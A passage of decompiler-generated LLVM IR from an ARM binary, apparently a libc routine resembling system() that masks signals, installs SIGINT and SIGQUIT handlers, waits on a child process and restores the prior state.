dec_label_pc_1187c:                               ; preds = %dec_label_pc_11864, %dec_label_pc_1185c
  %v3_1187c = load i32, i32* %stack_var_-88, align 4
  %v1_11884 = or i32 %v3_1187c, 65536
  store i32 %v1_11884, i32* %r3.global-to-local, align 4
  %v2_11888 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_11888, i32* %r1.global-to-local, align 4
  %v2_1188c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1188c, i32* %r2.global-to-local, align 4
  store i32 %v1_11884, i32* %stack_var_-88, align 4
  %v4_11894 = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-88, i32 %v2_1188c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_11898 = icmp slt i32 %v4_11894, 0
  br i1 %v1_11898, label %dec_label_pc_118a0, label %dec_label_pc_119a4

dec_label_pc_118a0:                               ; preds = %dec_label_pc_1187c
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_118a4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_118a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_118ac121 = inttoptr i32 %v0_118a4 to i32*
  %v2_118ac122 = load i32, i32* %v1_118ac121, align 4
  store i32 %v2_118ac122, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_118b0124 = icmp eq i32 %v2_118ac122, 0
  br i1 %v9_118b0124, label %dec_label_pc_118b8, label %dec_label_pc_118d0

dec_label_pc_118b8:                               ; preds = %dec_label_pc_118a0, %dec_label_pc_118b8.dec_label_pc_118ac_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_118c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_118c8, label %dec_label_pc_118cc, label %dec_label_pc_118b8.dec_label_pc_118ac_crit_edge

dec_label_pc_118b8.dec_label_pc_118ac_crit_edge:  ; preds = %dec_label_pc_118b8
  %v0_118ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_118b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_118ac = inttoptr i32 %v0_118ac.pre to i32*
  %v2_118ac = load i32, i32* %v1_118ac, align 4
  store i32 %v2_118ac, i32* %r3.global-to-local, align 4
  %v3_118b0 = icmp uge i32 %v2_118ac, %v1_118b0.pre
  store i1 %v3_118b0, i1* %cpsr_c.global-to-local, align 1
  %v9_118b0 = icmp eq i32 %v2_118ac, %v1_118b0.pre
  br i1 %v9_118b0, label %dec_label_pc_118b8, label %dec_label_pc_118d0

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118b8
  %v0_118cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_118cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_118d0

dec_label_pc_118d0:                               ; preds = %dec_label_pc_118a0, %dec_label_pc_118b8.dec_label_pc_118ac_crit_edge, %dec_label_pc_118cc
  %v0_118d0 = phi i32 [ %v0_118cc, %dec_label_pc_118cc ], [ %v2_118ac122, %dec_label_pc_118a0 ], [ %v2_118ac, %dec_label_pc_118b8.dec_label_pc_118ac_crit_edge ]
  %v1_118d0 = phi i32 [ %v0_118cc, %dec_label_pc_118cc ], [ 0, %dec_label_pc_118a0 ], [ %v1_118b0.pre, %dec_label_pc_118b8.dec_label_pc_118ac_crit_edge ]
  %v3_118d0 = icmp uge i32 %v0_118d0, %v1_118d0
  store i1 %v3_118d0, i1* %cpsr_c.global-to-local, align 1
  %v9_118d0 = icmp eq i32 %v0_118d0, %v1_118d0
  br i1 %v9_118d0, label %bb91, label %bb90

bb90:                                             ; preds = %dec_label_pc_118d0
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_118d0, %bb90
  store i32 71900, i32* @lr, align 4
  %v1_118d8 = xor i1 %v9_118d0, true
  call void @__pseudo_cond_branch(i1 %v1_118d8, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  store i32 13000, i32* %r2.global-to-local, align 4
  %v0_118e0 = load i32, i32* @r6, align 4
  %v2_118e0 = add i32 %v0_118e0, 13000
  %v3_118e0 = inttoptr i32 %v2_118e0 to i32*
  %v4_118e0 = load i32, i32* %v3_118e0, align 4
  store i32 %v4_118e0, i32* %r3.global-to-local, align 4
  %v1_118e4 = add i32 %v4_118e0, -1
  store i32 %v1_118e4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_118e8 = icmp eq i32 %v1_118e4, 0
  store i32 %v1_118e4, i32* %v3_118e0, align 4
  br i1 %v2_118e8, label %dec_label_pc_118f4, label %dec_label_pc_1193c

dec_label_pc_118f4:                               ; preds = %bb91
  store i32 ptrtoint (i32* @global_var_12768.735 to i32), i32* %r3.global-to-local, align 4
  store i32 12980, i32* %r1.global-to-local, align 4
  %v0_118fc = call i32 @__aeabi_read_tp()
  %v3_11900 = load i16, i16* @global_var_24070.401, align 2
  %v4_11900 = sext i16 %v3_11900 to i32
  store i32 %v4_11900, i32* %r3.global-to-local, align 4
  %v2_11904 = add i32 %v4_11900, %v0_118fc
  %v3_11904 = inttoptr i32 %v2_11904 to i32*
  %v4_11904 = load i32, i32* %v3_11904, align 4
  store i32 %v4_11904, i32* @r5, align 4
  %v0_11908 = load i32, i32* @r6, align 4
  %v1_11908 = load i32, i32* %r1.global-to-local, align 4
  %v2_11908 = add i32 %v1_11908, %v0_11908
  store i32 %v2_11908, i32* %r1.global-to-local, align 4
  %v0_1190c = load i32, i32* @r4, align 4
  store i32 %v0_1190c, i32* %r2.global-to-local, align 4
  %v3_11914 = call i32 @__libc_sigaction(i32 3, i32 %v2_11908, i32 %v0_1190c)
  br label %dec_label_pc_11918

dec_label_pc_11918:                               ; preds = %dec_label_pc_117fc, %dec_label_pc_118f4
  %v0_11920 = load i32, i32* @r6, align 4
  %v2_11920 = add i32 %v0_11920, 12960
  store i32 %v2_11920, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11928 = call i32 @__libc_sigaction(i32 2, i32 %v2_11920, i32 0)
  store i32 75572, i32* %r3.global-to-local, align 4
  %v0_11930 = call i32 @__aeabi_read_tp()
  %v3_11934 = load i16, i16* @global_var_24070.401, align 2
  %v4_11934 = sext i16 %v3_11934 to i32
  store i32 %v4_11934, i32* %r3.global-to-local, align 4
  %v0_11938 = load i32, i32* @r5, align 4
  %v3_11938 = add i32 %v4_11934, %v0_11930
  %v4_11938 = inttoptr i32 %v3_11938 to i32*
  store i32 %v0_11938, i32* %v4_11938, align 4
  br label %dec_label_pc_1193c

dec_label_pc_1193c:                               ; preds = %.thread64, %bb91, %dec_label_pc_11918
  store i32 13004, i32* %r5.global-to-local, align 4
  %v0_11940 = load i32, i32* @r6, align 4
  %v2_11940 = add i32 %v0_11940, 13004
  store i32 %v2_11940, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_11974.dec_label_pc_11944_crit_edge, %dec_label_pc_1193c
  %v0_1194c = phi i32 [ %v0_1194c.pre, %dec_label_pc_11974.dec_label_pc_11944_crit_edge ], [ %v2_11940, %dec_label_pc_1193c ]
  %v1_11944 = phi i32 [ %v1_11944.pre, %dec_label_pc_11974.dec_label_pc_11944_crit_edge ], [ 13004, %dec_label_pc_1193c ]
  %v0_11944 = phi i32 [ %v0_11944.pre, %dec_label_pc_11974.dec_label_pc_11944_crit_edge ], [ %v0_11940, %dec_label_pc_1193c ]
  %v2_11944 = add i32 %v0_11944, %v1_11944
  %v3_11944 = inttoptr i32 %v2_11944 to i32*
  %v4_11944 = load i32, i32* %v3_11944, align 4
  store i32 %v4_11944, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1194c, i32* %r2.global-to-local, align 4
  %v1_11950109 = inttoptr i32 %v0_1194c to i32*
  %v2_11950110 = load i32, i32* %v1_11950109, align 4
  store i32 %v2_11950110, i32* %r3.global-to-local, align 4
  %v3_11954112 = icmp uge i32 %v2_11950110, %v4_11944
  store i1 %v3_11954112, i1* %cpsr_c.global-to-local, align 1
  %v9_11954118 = icmp eq i32 %v2_11950110, %v4_11944
  br i1 %v9_11954118, label %dec_label_pc_1195c, label %dec_label_pc_11974

dec_label_pc_1195c:                               ; preds = %dec_label_pc_11944, %dec_label_pc_1195c.dec_label_pc_11950_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1196c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1196c, label %dec_label_pc_11970, label %dec_label_pc_1195c.dec_label_pc_11950_crit_edge

dec_label_pc_1195c.dec_label_pc_11950_crit_edge:  ; preds = %dec_label_pc_1195c
  %v0_11950.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11954.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11950 = inttoptr i32 %v0_11950.pre to i32*
  %v2_11950 = load i32, i32* %v1_11950, align 4
  store i32 %v2_11950, i32* %r3.global-to-local, align 4
  %v3_11954 = icmp uge i32 %v2_11950, %v1_11954.pre
  store i1 %v3_11954, i1* %cpsr_c.global-to-local, align 1
  %v9_11954 = icmp eq i32 %v2_11950, %v1_11954.pre
  br i1 %v9_11954, label %dec_label_pc_1195c, label %dec_label_pc_11974

dec_label_pc_11970:                               ; preds = %dec_label_pc_1195c
  %v0_11970 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11970, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %dec_label_pc_11944, %dec_label_pc_1195c.dec_label_pc_11950_crit_edge, %dec_label_pc_11970
  %v0_1197c = phi i32 [ %v0_11970, %dec_label_pc_11970 ], [ %v2_11950110, %dec_label_pc_11944 ], [ %v2_11950, %dec_label_pc_1195c.dec_label_pc_11950_crit_edge ]
  %v1_11974 = phi i32 [ %v0_11970, %dec_label_pc_11970 ], [ %v4_11944, %dec_label_pc_11944 ], [ %v1_11954.pre, %dec_label_pc_1195c.dec_label_pc_11950_crit_edge ]
  %v3_11974 = icmp uge i32 %v0_1197c, %v1_11974
  store i1 %v3_11974, i1* %cpsr_c.global-to-local, align 1
  %v9_11974 = icmp eq i32 %v0_1197c, %v1_11974
  br i1 %v9_11974, label %dec_label_pc_1197c, label %dec_label_pc_11974.dec_label_pc_11944_crit_edge

dec_label_pc_11974.dec_label_pc_11944_crit_edge:  ; preds = %dec_label_pc_11974
  %v0_11944.pre = load i32, i32* @r6, align 4
  %v1_11944.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1194c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11944

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11974
  %v2_1197c = icmp ne i32 %v1_11974, 0
  store i1 %v2_1197c, i1* %cpsr_c.global-to-local, align 1
  %v7_11980 = icmp slt i32 %v1_11974, 2
  br i1 %v7_11980, label %dec_label_pc_11c2c, label %dec_label_pc_11984

dec_label_pc_11984:                               ; preds = %dec_label_pc_1197c
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11c2c

dec_label_pc_119a4:                               ; preds = %dec_label_pc_1187c
  store i32 120, i32* %r3.global-to-local, align 4
  %v0_119a8 = load i32, i32* @r6, align 4
  %v2_119a8 = add i32 %v0_119a8, 120
  %v3_119a8 = inttoptr i32 %v2_119a8 to i32*
  %v4_119a8 = load i32, i32* %v3_119a8, align 4
  store i32 -76340, i32* %r3.global-to-local, align 4
  store i32 %v4_119a8, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_119b0 = icmp eq i32 %v4_119a8, 0
  br i1 %v2_119b0, label %.thread, label %bb92

.thread:                                          ; preds = %dec_label_pc_119a4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_119bc65 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_119bc65, i32* %r2.global-to-local, align 4
  %v3_119c0 = add i32 %v0_119a8, -76340
  store i32 %v3_119c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11ab0

bb92:                                             ; preds = %dec_label_pc_119a4
  store i32 1, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_119bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_119bc, i32* %r2.global-to-local, align 4
  %v3_119cc7 = add i32 %v0_119a8, -76340
  store i32 %v3_119cc7, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11ab0

dec_label_pc_11ab0:                               ; preds = %bb92, %.thread
  %v0_119b866 = phi i1 [ false, %.thread ], [ true, %bb92 ]
  call void @__pseudo_cond_branch(i1 %v0_119b866, i32 %v4_119a8)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 120, i32* @r7, align 4
  store i32 1048593, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1048593, i32* %stack_var_-40, align 4
  store i32 75152, i32* @r5, align 4
  %v2_11ab4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11ab4, i32* @r4, align 4
  br label %dec_label_pc_11ab8

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11ad4.dec_label_pc_11ab8_crit_edge, %dec_label_pc_11ab0
  %v3_11abc = phi i32 [ %v3_11abc.pre, %dec_label_pc_11ad4.dec_label_pc_11ab8_crit_edge ], [ 1048593, %dec_label_pc_11ab0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v2_11ab4, i32* %r1.global-to-local, align 4
  %v3_11ac4 = call i32 @__libc_waitpid(i32 %v3_11abc, i32 %v2_11ab4, i32 0)
  %v3_11ac8 = icmp eq i32 %v3_11ac4, -1
  store i1 %v3_11ac8, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_11ac4, i32* %r2.global-to-local, align 4
  br i1 %v3_11ac8, label %dec_label_pc_11ad4, label %dec_label_pc_11ae8

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11ab8
  %v0_11ad4 = call i32 @__aeabi_read_tp()
  %v3_11ad8 = load i16, i16* @global_var_24070.401, align 2
  %v4_11ad8 = sext i16 %v3_11ad8 to i32
  store i32 %v4_11ad8, i32* %r3.global-to-local, align 4
  %v2_11adc = add i32 %v4_11ad8, %v0_11ad4
  %v3_11adc = inttoptr i32 %v2_11adc to i32*
  %v4_11adc = load i32, i32* %v3_11adc, align 4
  store i32 %v4_11adc, i32* %r3.global-to-local, align 4
  %v2_11ae0 = icmp ugt i32 %v4_11adc, 3
  store i1 %v2_11ae0, i1* %cpsr_c.global-to-local, align 1
  %v7_11ae0 = icmp eq i32 %v4_11adc, 4
  br i1 %v7_11ae0, label %dec_label_pc_11ad4.dec_label_pc_11ab8_crit_edge, label %dec_label_pc_11ad4.dec_label_pc_11ae8_crit_edge

dec_label_pc_11ad4.dec_label_pc_11ae8_crit_edge:  ; preds = %dec_label_pc_11ad4
  %v0_11aec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11ae8

dec_label_pc_11ad4.dec_label_pc_11ab8_crit_edge:  ; preds = %dec_label_pc_11ad4
  %v3_11abc.pre = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_11ab8

dec_label_pc_11ae8:                               ; preds = %dec_label_pc_11ab8, %dec_label_pc_11ad4.dec_label_pc_11ae8_crit_edge
  %v0_11aec = phi i32 [ %v0_11aec.pre, %dec_label_pc_11ad4.dec_label_pc_11ae8_crit_edge ], [ %v3_11ac4, %dec_label_pc_11ab8 ]
  %v3_11ae8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_11ae8, i32* %r3.global-to-local, align 4
  %v3_11aec = icmp uge i32 %v0_11aec, %v3_11ae8
  store i1 %v3_11aec, i1* %cpsr_c.global-to-local, align 1
  %v9_11aec = icmp eq i32 %v0_11aec, %v3_11ae8
  br i1 %v9_11aec, label %dec_label_pc_11afc, label %dec_label_pc_11af4

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11ae8
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %stack_var_-36, align 4
  br label %dec_label_pc_11afc

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11ae8, %dec_label_pc_11af4
  %v0_11afc = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11afc = icmp eq i32 %v0_11afc, 0
  br i1 %v2_11afc, label %dec_label_pc_11afc..thread16_crit_edge, label %bb93

dec_label_pc_11afc..thread16_crit_edge:           ; preds = %dec_label_pc_11afc
  %v0_11b14.pre = load i32, i32* @ip, align 4
  br label %.thread16

bb93:                                             ; preds = %dec_label_pc_11afc
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v1_11b0c = load i32, i32* @r6, align 4
  %v3_11b0c = add i32 %v1_11b0c, 48
  %v4_11b0c = inttoptr i32 %v3_11b0c to i32*
  %v5_11b0c = load i32, i32* %v4_11b0c, align 4
  store i32 %v5_11b0c, i32* @ip, align 4
  br label %.thread16

.thread16:                                        ; preds = %dec_label_pc_11afc..thread16_crit_edge, %bb93
  %v0_11b14 = phi i32 [ %v0_11b14.pre, %dec_label_pc_11afc..thread16_crit_edge ], [ %v5_11b0c, %bb93 ]
  %v2_11b14 = xor i1 %v2_11afc, true
  call void @__pseudo_cond_branch(i1 %v2_11b14, i32 %v0_11b14)
  store i32 13004, i32* %r3.global-to-local, align 4
  %v0_11b1c = load i32, i32* @r6, align 4
  %v2_11b1c = add i32 %v0_11b1c, 13004
  store i32 %v2_11b1c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_11b1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_11b2c141 = inttoptr i32 %v2_11b1c to i32*
  %v2_11b2c142 = load i32, i32* %v1_11b2c141, align 4
  store i32 %v2_11b2c142, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_11b30144 = icmp eq i32 %v2_11b2c142, 0
  br i1 %v9_11b30144, label %dec_label_pc_11b38, label %dec_label_pc_11b50

dec_label_pc_11b38:                               ; preds = %.thread16, %dec_label_pc_11b38.dec_label_pc_11b2c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_11b48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11b48, label %dec_label_pc_11b4c, label %dec_label_pc_11b38.dec_label_pc_11b2c_crit_edge

dec_label_pc_11b38.dec_label_pc_11b2c_crit_edge:  ; preds = %dec_label_pc_11b38
  %v0_11b2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11b30.pre = load i32, i32* @r4, align 4
  %v1_11b2c = inttoptr i32 %v0_11b2c.pre to i32*
  %v2_11b2c = load i32, i32* %v1_11b2c, align 4
  store i32 %v2_11b2c, i32* %r3.global-to-local, align 4
  %v3_11b30 = icmp uge i32 %v2_11b2c, %v1_11b30.pre
  store i1 %v3_11b30, i1* %cpsr_c.global-to-local, align 1
  %v9_11b30 = icmp eq i32 %v2_11b2c, %v1_11b30.pre
  br i1 %v9_11b30, label %dec_label_pc_11b38, label %dec_label_pc_11b50

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11b38
  %v0_11b4c = load i32, i32* @r4, align 4
  store i32 %v0_11b4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11b50

dec_label_pc_11b50:                               ; preds = %.thread16, %dec_label_pc_11b38.dec_label_pc_11b2c_crit_edge, %dec_label_pc_11b4c
  %v0_11b50 = phi i32 [ %v0_11b4c, %dec_label_pc_11b4c ], [ %v2_11b2c142, %.thread16 ], [ %v2_11b2c, %dec_label_pc_11b38.dec_label_pc_11b2c_crit_edge ]
  %v1_11b50 = phi i32 [ %v0_11b4c, %dec_label_pc_11b4c ], [ 0, %.thread16 ], [ %v1_11b30.pre, %dec_label_pc_11b38.dec_label_pc_11b2c_crit_edge ]
  %v3_11b50 = icmp uge i32 %v0_11b50, %v1_11b50
  store i1 %v3_11b50, i1* %cpsr_c.global-to-local, align 1
  %v9_11b50 = icmp eq i32 %v0_11b50, %v1_11b50
  br i1 %v9_11b50, label %bb95, label %bb94

bb94:                                             ; preds = %dec_label_pc_11b50
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_11b50, %bb94
  store i32 72540, i32* @lr, align 4
  %v1_11b58 = xor i1 %v9_11b50, true
  call void @__pseudo_cond_branch(i1 %v1_11b58, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  store i32 13000, i32* %r2.global-to-local, align 4
  %v0_11b60 = load i32, i32* @r6, align 4
  %v2_11b60 = add i32 %v0_11b60, 13000
  %v3_11b60 = inttoptr i32 %v2_11b60 to i32*
  %v4_11b60 = load i32, i32* %v3_11b60, align 4
  store i32 %v4_11b60, i32* %r3.global-to-local, align 4
  %v1_11b64 = add i32 %v4_11b60, -1
  store i32 %v1_11b64, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11b68 = icmp eq i32 %v1_11b64, 0
  store i32 %v1_11b64, i32* %v3_11b60, align 4
  br i1 %v2_11b68, label %dec_label_pc_11b74, label %dec_label_pc_11ba8

dec_label_pc_11b74:                               ; preds = %bb95
  %v0_11b78 = load i32, i32* @r7, align 4
  store i32 %v0_11b78, i32* %r2.global-to-local, align 4
  %v0_11b7c = load i32, i32* @r6, align 4
  %v2_11b7c = add i32 %v0_11b7c, 12960
  store i32 %v2_11b7c, i32* %r1.global-to-local, align 4
  %v3_11b84 = call i32 @__libc_sigaction(i32 2, i32 %v2_11b7c, i32 %v0_11b78)
  store i32 %v3_11b84, i32* @r5, align 4
  %v0_11b90 = load i32, i32* @r7, align 4
  store i32 %v0_11b90, i32* %r2.global-to-local, align 4
  %v0_11b94 = load i32, i32* @r6, align 4
  %v2_11b94 = add i32 %v0_11b94, 12980
  store i32 %v2_11b94, i32* %r1.global-to-local, align 4
  %v3_11b9c = call i32 @__libc_sigaction(i32 3, i32 %v2_11b94, i32 %v0_11b90)
  %v1_11ba0 = load i32, i32* @r5, align 4
  %v2_11ba0 = or i32 %v1_11ba0, %v3_11b9c
  %v4_11ba0 = icmp eq i32 %v2_11ba0, 0
  br i1 %v4_11ba0, label %dec_label_pc_11ba8, label %dec_label_pc_11bc0

dec_label_pc_11ba8:                               ; preds = %dec_label_pc_11b74, %bb95
  %v0_11ba8 = load i32, i32* @r4, align 4
  store i32 %v0_11ba8, i32* %r2.global-to-local, align 4
  store i32 %v2_1188c, i32* %r1.global-to-local, align 4
  %v4_11bb4 = call i32 @__GI_sigprocmask(i32 2, i32* nonnull %stack_var_-48, i32 %v0_11ba8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11bb8 = icmp eq i32 %v4_11bb4, 0
  br i1 %v2_11bb8, label %dec_label_pc_11bc8, label %dec_label_pc_11bc0

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11b74, %dec_label_pc_11ba8
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %stack_var_-36, align 4
  br label %dec_label_pc_11bc8

dec_label_pc_11bc8:                               ; preds = %dec_label_pc_11ba8, %dec_label_pc_11bc0
  store i32 13004, i32* %r5.global-to-local, align 4
  %v0_11bcc = load i32, i32* @r6, align 4
  %v2_11bcc = add i32 %v0_11bcc, 13004
  store i32 %v2_11bcc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11c00.dec_label_pc_11bd0_crit_edge, %dec_label_pc_11bc8
  %v0_11bd8 = phi i32 [ %v0_11bd8.pre, %dec_label_pc_11c00.dec_label_pc_11bd0_crit_edge ], [ %v2_11bcc, %dec_label_pc_11bc8 ]
  %v1_11bd0 = phi i32 [ %v1_11bd0.pre, %dec_label_pc_11c00.dec_label_pc_11bd0_crit_edge ], [ 13004, %dec_label_pc_11bc8 ]
  %v0_11bd0 = phi i32 [ %v0_11bd0.pre, %dec_label_pc_11c00.dec_label_pc_11bd0_crit_edge ], [ %v0_11bcc, %dec_label_pc_11bc8 ]
  %v2_11bd0 = add i32 %v0_11bd0, %v1_11bd0
  %v3_11bd0 = inttoptr i32 %v2_11bd0 to i32*
  %v4_11bd0 = load i32, i32* %v3_11bd0, align 4
  store i32 %v4_11bd0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_11bd8, i32* %r2.global-to-local, align 4
  %v1_11bdc128 = inttoptr i32 %v0_11bd8 to i32*
  %v2_11bdc129 = load i32, i32* %v1_11bdc128, align 4
  store i32 %v2_11bdc129, i32* %r3.global-to-local, align 4
  %v3_11be0131 = icmp uge i32 %v2_11bdc129, %v4_11bd0
  store i1 %v3_11be0131, i1* %cpsr_c.global-to-local, align 1
  %v9_11be0137 = icmp eq i32 %v2_11bdc129, %v4_11bd0
  br i1 %v9_11be0137, label %dec_label_pc_11be8, label %dec_label_pc_11c00

dec_label_pc_11be8:                               ; preds = %dec_label_pc_11bd0, %dec_label_pc_11be8.dec_label_pc_11bdc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_11bf8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11bf8, label %dec_label_pc_11bfc, label %dec_label_pc_11be8.dec_label_pc_11bdc_crit_edge

dec_label_pc_11be8.dec_label_pc_11bdc_crit_edge:  ; preds = %dec_label_pc_11be8
  %v0_11bdc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11be0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11bdc = inttoptr i32 %v0_11bdc.pre to i32*
  %v2_11bdc = load i32, i32* %v1_11bdc, align 4
  store i32 %v2_11bdc, i32* %r3.global-to-local, align 4
  %v3_11be0 = icmp uge i32 %v2_11bdc, %v1_11be0.pre
  store i1 %v3_11be0, i1* %cpsr_c.global-to-local, align 1
  %v9_11be0 = icmp eq i32 %v2_11bdc, %v1_11be0.pre
  br i1 %v9_11be0, label %dec_label_pc_11be8, label %dec_label_pc_11c00

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11be8
  %v0_11bfc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11bfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11c00

dec_label_pc_11c00:                               ; preds = %dec_label_pc_11bd0, %dec_label_pc_11be8.dec_label_pc_11bdc_crit_edge, %dec_label_pc_11bfc
  %v0_11c08 = phi i32 [ %v0_11bfc, %dec_label_pc_11bfc ], [ %v2_11bdc129, %dec_label_pc_11bd0 ], [ %v2_11bdc, %dec_label_pc_11be8.dec_label_pc_11bdc_crit_edge ]
  %v1_11c00 = phi i32 [ %v0_11bfc, %dec_label_pc_11bfc ], [ %v4_11bd0, %dec_label_pc_11bd0 ], [ %v1_11be0.pre, %dec_label_pc_11be8.dec_label_pc_11bdc_crit_edge ]
  %v3_11c00 = icmp uge i32 %v0_11c08, %v1_11c00
  store i1 %v3_11c00, i1* %cpsr_c.global-to-local, align 1
  %v9_11c00 = icmp eq i32 %v0_11c08, %v1_11c00
  br i1 %v9_11c00, label %dec_label_pc_11c08, label %dec_label_pc_11c00.dec_label_pc_11bd0_crit_edge

dec_label_pc_11c00.dec_label_pc_11bd0_crit_edge:  ; preds = %dec_label_pc_11c00
  %v0_11bd0.pre = load i32, i32* @r6, align 4
  %v1_11bd0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_11bd8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11bd0

dec_label_pc_11c08:                               ; preds = %dec_label_pc_11c00
  %v2_11c08 = icmp ne i32 %v1_11c00, 0
  store i1 %v2_11c08, i1* %cpsr_c.global-to-local, align 1
  %v7_11c0c = icmp slt i32 %v1_11c00, 2
  br i1 %v7_11c0c, label %dec_label_pc_11c28, label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %dec_label_pc_11c08
  %v0_11c14 = load i32, i32* %r1.global-to-local, align 4
  %v1_11c14 = add i32 %v0_11c14, 129
  store i32 %v1_11c14, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11c28

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11c10, %dec_label_pc_11c08
  %v3_11c28 = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_1197c, %dec_label_pc_11984, %dec_label_pc_11c28
  %storemerge = phi i32 [ %v3_11c28, %dec_label_pc_11c28 ], [ -1, %dec_label_pc_11984 ], [ -1, %dec_label_pc_1197c ]
  store i32 %v3_11730, i32* @r4, align 4
  store i32 %v6_11730, i32* @r5, align 4
  store i32 %v9_11730, i32* @r6, align 4
  store i32 %v12_11730, i32* @r7, align 4
  store i32 %v15_11730, i32* @r8, align 4
  store i32 %v21_11730, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_11bfc, { 1, 0, 2 }
  uselistorder i32 %v1_11be0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_11b4c, { 1, 0, 2 }
  uselistorder i32 %v1_11b30.pre, { 0, 2, 1 }
  uselistorder i32 %v2_11ab4, { 1, 0, 2 }
  uselistorder i32 %v0_119a8, { 1, 0, 2 }
